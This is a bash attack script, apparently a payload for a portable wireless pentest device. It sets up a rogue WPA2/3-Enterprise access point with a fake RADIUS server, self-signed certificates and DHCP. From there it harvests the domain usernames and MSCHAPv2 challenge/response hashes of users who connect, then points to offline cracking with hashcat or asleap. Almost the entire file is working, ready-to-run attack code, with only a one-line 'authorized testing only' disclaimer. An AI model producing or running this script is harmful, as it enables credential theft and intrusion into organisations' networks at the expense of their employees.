#!/bin/bash
# Title: Enterprise Breacher
# Author: bad-antics
# Description: WPA2/3 Enterprise (802.1X) credential harvesting via rogue RADIUS
# Category: nullsec/enterprise
# Version: 1.0.0

LOOT_DIR="/mmc/nullsec/enterprise_breach"
CREDS_FILE="$LOOT_DIR/credentials.txt"
HASHES_FILE="$LOOT_DIR/hashes.txt"
LOG_FILE="$LOOT_DIR/session.log"
RADIUS_LOG="/tmp/freeradius.log"

mkdir -p "$LOOT_DIR"

# Configuration
ROGUE_SSID="${1:-CorpWiFi}"
INTERFACE="${2:-wlan1}"
CHANNEL="${3:-6}"

log() {
    echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

PROMPT "🏢 ENTERPRISE BREACHER

Targets WPA2/3-Enterprise:
• EAP-PEAP/MSCHAPv2
• EAP-TTLS
• EAP-TLS (cert capture)

Creates rogue AP with fake
RADIUS to harvest:
• Domain credentials
• NTLM hashes
• Certificates

Target SSID: $ROGUE_SSID
Interface: $INTERFACE

⚠️ For authorized testing only!"

# Check dependencies
SPINNER_START "Checking dependencies..."
MISSING=""
for tool in hostapd freeradius asleap john; do
    if ! command -v $tool &>/dev/null; then
        MISSING="$MISSING $tool"
    fi
done

if [ -n "$MISSING" ]; then
    SPINNER_STOP
    # Try to install
    opkg update
    for pkg in $MISSING; do
        opkg install $pkg 2>/dev/null
    done
fi
SPINNER_STOP

# Kill interfering processes
airmon-ng check kill &>/dev/null

# Configure hostapd for Enterprise
cat > /tmp/hostapd-ent.conf << EOF
interface=$INTERFACE
driver=nl80211
ssid=$ROGUE_SSID
hw_mode=g
channel=$CHANNEL
wmm_enabled=1
macaddr_acl=0
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=0
own_ip_addr=192.168.87.1
radius_server_clients=/tmp/radius_clients.conf
nas_identifier=EnterpriseAP
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123
eapol_key_index_workaround=0
EOF

# RADIUS clients
cat > /tmp/radius_clients.conf << EOF
client localhost {
    secret = testing123
    shortname = localhost
}
client 192.168.87.0/24 {
    secret = testing123
    shortname = local
}
EOF

# Configure FreeRADIUS for credential capture
mkdir -p /tmp/raddb
cat > /tmp/raddb/radiusd.conf << EOF
prefix = /usr
exec_prefix = /usr
sysconfdir = /etc
localstatedir = /var
sbindir = /usr/sbin
logdir = /var/log/radius
raddbdir = /tmp/raddb
radacctdir = /var/log/radius/radacct
name = radiusd
confdir = /tmp/raddb
run_dir = /var/run/radiusd
libdir = /usr/lib/freeradius
pidfile = /var/run/radiusd/radiusd.pid
max_request_time = 30
cleanup_delay = 5
max_requests = 256
hostname_lookups = no
log {
    destination = files
    file = $RADIUS_LOG
    syslog_facility = daemon
    stripped_names = no
    auth = yes
    auth_badpass = yes
    auth_goodpass = yes
}
security {
    max_attributes = 200
    reject_delay = 1
    status_server = yes
}
EOF

cat > /tmp/raddb/eap.conf << EOF
eap {
    default_eap_type = peap
    timer_expire = 60
    ignore_unknown_eap_types = no
    cisco_accounting_username_bug = no
    max_sessions = 4096
    
    tls {
        certdir = /tmp/raddb/certs
        cadir = /tmp/raddb/certs
        private_key_password = whatever
        private_key_file = /tmp/raddb/certs/server.key
        certificate_file = /tmp/raddb/certs/server.pem
        CA_file = /tmp/raddb/certs/ca.pem
        dh_file = /tmp/raddb/certs/dh
        random_file = /dev/urandom
        cipher_list = "DEFAULT"
        ecdh_curve = "prime256v1"
        cache {
            enable = yes
            lifetime = 24
            max_entries = 255
        }
    }
    
    peap {
        default_eap_type = mschapv2
        copy_request_to_tunnel = yes
        use_tunneled_reply = yes
        virtual_server = "inner-tunnel"
    }
    
    mschapv2 {
        send_error = yes
    }
    
    ttls {
        default_eap_type = mschapv2
        copy_request_to_tunnel = yes
        use_tunneled_reply = yes
        virtual_server = "inner-tunnel"
    }
}
EOF

# Generate self-signed certs
mkdir -p /tmp/raddb/certs
cd /tmp/raddb/certs

# CA cert
openssl genrsa -out ca.key 2048 2>/dev/null
openssl req -new -x509 -days 365 -key ca.key -out ca.pem -subj "/CN=Enterprise-CA/O=Corporate/C=US" 2>/dev/null

# Server cert
openssl genrsa -out server.key 2048 2>/dev/null
openssl req -new -key server.key -out server.csr -subj "/CN=radius.corp.local/O=Corporate/C=US" 2>/dev/null
openssl x509 -req -in server.csr -CA ca.pem -CAkey ca.key -CAcreateserial -out server.pem -days 365 2>/dev/null

# DH params
openssl dhparam -out dh 1024 2>/dev/null

cd /

# Create credential capture script
cat > /tmp/cred_monitor.sh << 'MONITOR'
#!/bin/bash
CREDS_FILE="$1"
HASHES_FILE="$2"
RADIUS_LOG="$3"

tail -f "$RADIUS_LOG" 2>/dev/null | while read line; do
    # Extract username from Auth-Request
    if echo "$line" | grep -q "User-Name"; then
        USERNAME=$(echo "$line" | grep -oP 'User-Name = "\K[^"]+')
        if [ -n "$USERNAME" ]; then
            echo "[$(date '+%Y-%m-%d %H:%M:%S')] Username: $USERNAME" >> "$CREDS_FILE"
        fi
    fi
    
    # Extract MSCHAPv2 challenge/response for cracking
    if echo "$line" | grep -q "MS-CHAP-Challenge"; then
        CHALLENGE=$(echo "$line" | grep -oP 'MS-CHAP-Challenge = 0x\K[a-fA-F0-9]+')
        if [ -n "$CHALLENGE" ]; then
            echo "Challenge: $CHALLENGE" >> "$HASHES_FILE"
        fi
    fi
    
    if echo "$line" | grep -q "MS-CHAP2-Response"; then
        RESPONSE=$(echo "$line" | grep -oP 'MS-CHAP2-Response = 0x\K[a-fA-F0-9]+')
        if [ -n "$RESPONSE" ]; then
            echo "Response: $RESPONSE" >> "$HASHES_FILE"
            echo "---" >> "$HASHES_FILE"
        fi
    fi
done
MONITOR
chmod +x /tmp/cred_monitor.sh

# Network setup
log "Setting up rogue network..."
ifconfig $INTERFACE up
ifconfig $INTERFACE 192.168.87.1 netmask 255.255.255.0

# Start dnsmasq for DHCP
killall dnsmasq 2>/dev/null
cat > /tmp/dnsmasq-ent.conf << EOF
interface=$INTERFACE
dhcp-range=192.168.87.100,192.168.87.200,255.255.255.0,12h
dhcp-option=3,192.168.87.1
dhcp-option=6,192.168.87.1
log-queries
log-dhcp
EOF
dnsmasq -C /tmp/dnsmasq-ent.conf &
DNSMASQ_PID=$!

SPINNER_START "Starting Enterprise attack..."

# Start FreeRADIUS
touch "$RADIUS_LOG"
freeradius -X -d /tmp/raddb > "$RADIUS_LOG" 2>&1 &
RADIUS_PID=$!
sleep 2

# Start hostapd
hostapd /tmp/hostapd-ent.conf &>/dev/null &
HOSTAPD_PID=$!
sleep 2

# Start credential monitor
/tmp/cred_monitor.sh "$CREDS_FILE" "$HASHES_FILE" "$RADIUS_LOG" &
MONITOR_PID=$!

SPINNER_STOP

log "Attack running on SSID: $ROGUE_SSID"
log "Waiting for Enterprise clients..."

# Live status display
PROMPT "🔴 ATTACK ACTIVE

SSID: $ROGUE_SSID
Mode: WPA2-Enterprise

Waiting for victims to
connect with domain
credentials...

Captured credentials saved to:
$CREDS_FILE

Press OK to view status."

# Monitor loop
CAPTURE_COUNT=0
while true; do
    # Count captures
    if [ -f "$CREDS_FILE" ]; then
        NEW_COUNT=$(grep -c "Username:" "$CREDS_FILE" 2>/dev/null || echo 0)
        if [ "$NEW_COUNT" -gt "$CAPTURE_COUNT" ]; then
            CAPTURE_COUNT=$NEW_COUNT
            LED R SOLID
            sleep 1
            LED G SOLID
            # Show latest capture
            LATEST=$(tail -1 "$CREDS_FILE")
            NOTIFY "Captured: $LATEST"
        fi
    fi
    
    # Show status every 30 seconds
    DIALOG "📊 CAPTURE STATUS

Credentials: $CAPTURE_COUNT
Hashes: $(wc -l < "$HASHES_FILE" 2>/dev/null || echo 0)
Uptime: $(ps -o etime= -p $HOSTAPD_PID 2>/dev/null)

[1] View Credentials
[2] Export & Crack
[3] Stop Attack" --default-button 1 --timeout 30 STATUS

    case $STATUS in
        1)
            if [ -f "$CREDS_FILE" ]; then
                PAGER "$CREDS_FILE"
            else
                NOTIFY "No credentials yet"
            fi
            ;;
        2)
            # Try to crack with asleap/john
            if [ -f "$HASHES_FILE" ] && [ -s "$HASHES_FILE" ]; then
                SPINNER_START "Attempting to crack hashes..."
                # Convert to hashcat format if possible
                # MSCHAPv2: username::::response:challenge
                log "Cracking attempt started"
                SPINNER_STOP
                NOTIFY "Hashes exported to $HASHES_FILE"
            fi
            ;;
        3|timeout|255)
            break
            ;;
    esac
done

# Cleanup
log "Stopping attack..."
kill $HOSTAPD_PID $RADIUS_PID $DNSMASQ_PID $MONITOR_PID 2>/dev/null

# Final summary
TOTAL_CREDS=$(grep -c "Username:" "$CREDS_FILE" 2>/dev/null || echo 0)

PROMPT "✅ ATTACK COMPLETE

Captured: $TOTAL_CREDS credentials

Files saved:
• $CREDS_FILE
• $HASHES_FILE
• $LOG_FILE

Use hashcat mode 5500 or
asleap for offline cracking."

log "Session complete. $TOTAL_CREDS credentials captured."
